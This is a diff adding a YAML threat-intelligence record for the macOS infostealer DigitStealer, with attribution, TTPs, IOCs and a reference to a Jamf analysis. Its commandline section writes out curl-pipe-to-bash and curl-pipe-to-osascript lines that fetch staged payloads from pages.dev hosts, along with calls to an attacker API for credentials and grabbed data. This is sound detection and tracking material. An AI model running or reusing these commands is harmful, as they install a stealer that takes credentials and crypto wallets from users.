@@ -1,0 +1,109 @@
+description: "DigitStealer is a macOS infostealer that uses a drag\u2011to\u2011terminal\
+  \ dropper to download and execute multiple staged payloads, including AppleScript,\
+  \ JXA, and Bash scripts, with persistence via a LaunchAgent."
+attribution: Unknown
+malware_families:
+- DigitStealer
+- DynamicLake
+- GoogleDriver
+TTPs:
+  processes: []
+  commandline:
+  - curl -fsSL https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/c9c114433040497328fe9212012b1b94.aspx
+    | bash
+  - nohup curl -fsSL https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/054e6893413402d220f5d7db8ef24af0.aspx
+    | osascript >/dev/null 2>&1 &
+  - nohup curl -fsSL https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/f42bb3a975870049d950dfa861d0edd4.aspx
+    | osascript -l JavaScript >/dev/null 2>&1 &
+  - nohup curl -fsSL https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/1e5234329ce17cfcee094aa77cb6c801.aspx
+    | osascript -l JavaScript >/dev/null 2>&1 &
+  - nohup curl -fsSL https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/2bbfdf3250a663cf7c4e10fc50dfc7da.aspx
+    | bash >/dev/null 2>&1 &
+  - curl -fsSL https://goldenticketsshop.com/api/credentials
+  - curl -fsSL https://goldenticketsshop.com/api/grabber
+  - curl -fsSL https://goldenticketsshop.com/api/log
+  - curl -fsSL https://goldenticketsshop.com/api/poll
+  powershell: []
+  scripting_engine:
+  - AppleScript (payload_1_stealer.scpt)
+  - JXA (payload_2_obfuscated_wallet_crypto_JXA_stealer.scpt, payload_3_ledger_live_injection_JXA.scpt,
+    payload_4_persistent_backdoor_JXA.sh)
+  - Bash scripts (stage_1_dropper_bash.sh, payload_4_LaunchAgent_bash.sh, etc.)
+  - AppleScript payloads (payload_1_ledger_live.scpt, payload_1_stealer.scpt, payload_2_obfuscated_wallet_crypto_JXA_stealer.scpt,
+    payload_3_ledger_live_injection_JXA.scpt, payload_4_persistent_backdoor_JXA.sh)
+  - JXA scripts (payload_2_wallet_crypto_JXA_stealer.scpt, payload_3_obfuscated_ledger_live_injection_JXA.scpt,
+    payload_4_obfuscated_persistent_backdoor_JXA.sh)
+  - JavaScript executed via osascript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: bash
+    destination: 67e5143a9ca7d2240c137ef80f2641d6.pages.dev
+    port: 443
+  - process: osascript
+    destination: goldenticketsshop.com
+    port: 443
+  - process: bash
+    destination: goldenticketsshop.com
+    port: 443
+  - executable: curl
+    destination: 67e5143a9ca7d2240c137ef80f2641d6.pages.dev
+    port: 443
+  - executable: osascript
+    destination: goldenticketsshop.com
+    port: 443
+  file_activity:
+  - /tmp/wid.txt
+  - ~/Library/Application Support/Ledger Live/app.json
+  persistence:
+  - LaunchAgent persistence via payload_4_LaunchAgent_bash.sh
+  - LaunchAgent plist created in ~/Library/LaunchAgents/
+  process_relations: []
+IOCs:
+  hashes:
+  - da99f7570b37ddb3d4ed650bc33fa9fbfb883753b2c212704c10f2df12c19f63
+  - abd54b02695338b554def160008038b5c9fd124bb84b26984bab969d91f9d96b
+  - ea9e548b27e07d068449cd44b68cf086a652c4bee0080af19da1c9f988bd0897
+  - fb3e5b804ca57b71368c7dfffcf8f20a7d66266bb6d36146163b9ec80e31aafe
+  - 4832942ec7d8a80b4b30e3c9ed5d9e0e4a0e3d19aeaedb3fdbdcc266ba3a560c
+  - 440b91df67389e2421dc32e878c38926d21f197f2982f2e446497cf3ab20ce8f
+  - b240c906ebbe27adf83aba1c13d70cd6d778681e10680d8a6b1dc18e5af5c274
+  - ff6959cf92bce91b4f51651f5c3ef16c263095bc7d7f017ea402db1b79e9ece4
+  - 498d271d695e424bfd7f9ad1ead187ef0ac62fa8908c6e1f239db495371ff237
+  - 7bf9609b351b38d8a54d5c0e9759fcfb21157beeac343452c129bcbbe9ee6b02
+  - 226cbbf43d9bcedcc5ab69e51e5cce2f4ca841aa7ab39fdf974766203e2c9b66
+  - d1b9f14565a0aec33cc17b4db86d92df00b00232725791567ee34f107dac810a
+  - 05bee860231a9686ea9205bc43cd09a31155a4d191390594a8e308d6d36eeb2f
+  - 5420a25fdd6cb6484ab3687c6bba750b40007730eb4232088b668eff0de2c072
+  - 12e630d6041eb7322901150079c0d0fdbd47b0098dc5cb0f2de23b6e8d5082e1
+  - b8e80185aee2584231c872acc67dfbfeb64b148d07ea1e1aa99668bd849b95a7
+  - fb237b161fe39322440f5e7e5f8cce5f969ebe179a81342aec94c0697a0bd364
+  domains:
+  - dynamiclake.org
+  - goldenticketsshop.com
+  - pages.dev
+  - sweetseedsbeep.com
+  - nevadabtcshill.com
+  - ledgmanyman.com
+  urls:
+  - https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/c9c114433040497328fe9212012b1b94.aspx
+  - https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/054e6893413402d220f5d7db8ef24af0.aspx
+  - https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/f42bb3a975870049d950dfa861d0edd4.aspx
+  - https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/1e5234329ce17cfcee094aa77cb6c801.aspx
+  - https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/2bbfdf3250a663cf7c4e10fc50dfc7da.aspx
+  - https://goldenticketsshop.com/api/credentials
+  - https://goldenticketsshop.com/api/grabber
+  - https://goldenticketsshop.com/api/log
+  - https://goldenticketsshop.com/api/poll
+  - https://f8b2ef8b94b215ce04836d1c47b556ba.pages.dev/1c9e2dffde32a91a712e06282a938ba3.aspx
+  - https://f8b2ef8b94b215ce04836d1c47b556ba.pages.dev/0533ae5df654f42b933c41e76680720f.aspx
+  - https://f8b2ef8b94b215ce04836d1c47b556ba.pages.dev/0eea30b1116586c6872367fb2b711205.aspx
+  - https://f8b2ef8b94b215ce04836d1c47b556ba.pages.dev/f2c70c5a2e208714eca43cbddb3cac82.aspx
+  - https://ledgmanyman.com
+  - https://f0561b4e3c1308eeb8cdd23016ed86ec.pages.dev/0293357d93632edc913fcc8f5c40bfd0.aspx
+  ips: []
+authors:
+- Thijs Xhaflaire
+reference: https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/
+date_of_publication: November 13, 2025
+file_creation_date: November 13, 2025
